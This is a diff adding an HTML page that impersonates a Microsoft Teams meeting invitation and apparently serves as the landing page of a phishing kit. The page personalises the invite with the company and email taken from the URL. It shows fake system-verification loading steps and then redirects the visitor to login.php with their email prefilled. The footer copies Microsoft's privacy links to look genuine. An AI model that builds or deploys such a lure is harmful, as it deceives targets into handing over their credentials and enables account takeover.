@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="icon" href="/logo/logo.svg" type="image/png">
+
+  <title>Join Meeting</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f7f7f7;
+      text-align: center;
+      margin: 0;
+      padding-top: 60px;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .card {
+      background: white;
+      max-width: 400px;
+      margin: auto;
+      padding: 40px;
+      border-radius: 16px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      position: relative;
+    }
+    .logo {
+      font-size: 60px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+    h2 { margin-bottom: 10px; color: #333; }
+    p { color: #555; font-size: 15px; }
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .browser-btn {
+      background-color: navy;
+      color: white;
+    }
+    .app-btn {
+      background-color: #eee;
+      color: #222;
+    }
+
+    /* Loading overlay styles */
+    .loading-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: white;
+      border-radius: 16px;
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 10;
+    }
+
+    .loading-spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid navy;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    .loading-text {
+      font-size: 14px;
+      color: #333;
+      margin: 5px 0;
+      font-weight: 500;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Footer styles */
+    .footer {
+      margin-top: auto;
+      padding: 30px 20px;
+      color: #666;
+      font-size: 12px;
+      border-top: 1px solid #eee;
+      background-color: #fafafa;
+    }
+
+    .footer-links {
+      margin-bottom: 15px;
+    }
+
+    .footer-links a {
+      color: #666;
+      text-decoration: none;
+      margin: 0 10px;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+      color: #333;
+    }
+
+    .footer-logo {
+      font-size: 16px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      color: #444;
+    }
+
+    .download-link {
+      color: #0067b8;
+      text-decoration: none;
+      font-weight: 500;
+      margin-bottom: 15px;
+      display: inline-block;
+    }
+
+    .download-link:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="logo">💬</div>
+      <h2 id="welcome">Welcome</h2>
+      <p id="message">You have been invited to join a meeting.</p>
+
+      <button class="browser-btn" id="browserBtn">Continue on this browser</button>
+      <button class="app-btn" onclick="alert('Opening Teams app...')">Join on a Teams App</button>
+
+      <!-- Loading overlay -->
+      <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text" id="loadingStep1">Launching...</div>
+        <div class="loading-text" id="loadingStep2" style="display: none;">System verification...</div>
+        <div class="loading-text" id="loadingStep3" style="display: none;">Detecting operating system...</div>
+        <div class="loading-text" id="loadingStep4" style="display: none;">Connecting to Meeting...</div>
+        <div class="loading-text" id="loadingStep5" style="display: none;">Initializing...</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer-logo"><img src="/logo/logo.svg" width="25" height="25"> Teams</div>
+    <a href="#" class="download-link">Don't have the app? Download now</a>
+    <div class="footer-links">
+      <a href="#">Privacy & Cookies</a>
+      <a href="#">Consumer Health Privacy</a>
+      <a href="#">Third-party disclosures</a>
+    </div>
+    <div>© 2025</div>
+  </footer>
+
+  <script>
+    // Read URL parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    const company = decodeURIComponent(urlParams.get('company') || '');
+    const email = decodeURIComponent(urlParams.get('email') || '');
+    const meetingId = urlParams.get('id');
+
+    // Display info dynamically
+    if (company && email) {
+      document.getElementById('welcome').innerText = `Welcome ${company}`;
+      document.getElementById('message').innerText = 
+        `You have been invited to join a meeting (ID: ${meetingId}).\nEmail: ${email}`;
+    }
+
+    // Add click handler for browser button
+    document.getElementById('browserBtn').addEventListener('click', function() {
+      const loadingOverlay = document.getElementById('loadingOverlay');
+      const browserBtn = document.getElementById('browserBtn');
+      
+      // Show loading overlay and disable button
+      loadingOverlay.style.display = 'flex';
+      browserBtn.disabled = true;
+      browserBtn.style.opacity = '0.6';
+      
+      // Start the loading sequence
+      startLoadingSequence(email);
+    });
+
+    function startLoadingSequence(email) {
+      const steps = [
+        { id: 'loadingStep1', text: 'Launching...', delay: 1000 },
+        { id: 'loadingStep2', text: 'System verification...', delay: 1500 },
+        { id: 'loadingStep3', text: 'Detecting operating system...', delay: 1200 },
+        { id: 'loadingStep4', text: 'Connecting to Meeting...', delay: 1800 },
+        { id: 'loadingStep5', text: 'Initializing...', delay: 1400 }
+      ];
+
+      let currentStep = 0;
+
+      function showNextStep() {
+        if (currentStep > 0) {
+          // Hide previous step
+          document.getElementById(steps[currentStep - 1].id).style.display = 'none';
+        }
+        
+        if (currentStep < steps.length) {
+          // Show current step
+          document.getElementById(steps[currentStep].id).style.display = 'block';
+          currentStep++;
+          
+          // Schedule next step or redirect
+          if (currentStep < steps.length) {
+            setTimeout(showNextStep, steps[currentStep - 1].delay);
+          } else {
+            // All steps completed, redirect to login page
+            setTimeout(() => {
+              const loginUrl = `login.php?email=${encodeURIComponent(email)}`;
+              window.location.href = loginUrl;
+            }, steps[steps.length - 1].delay);
+          }
+        }
+      }
+
+      // Start the sequence
+      showNextStep();
+    }
+  </script>
+</body>
+</html>
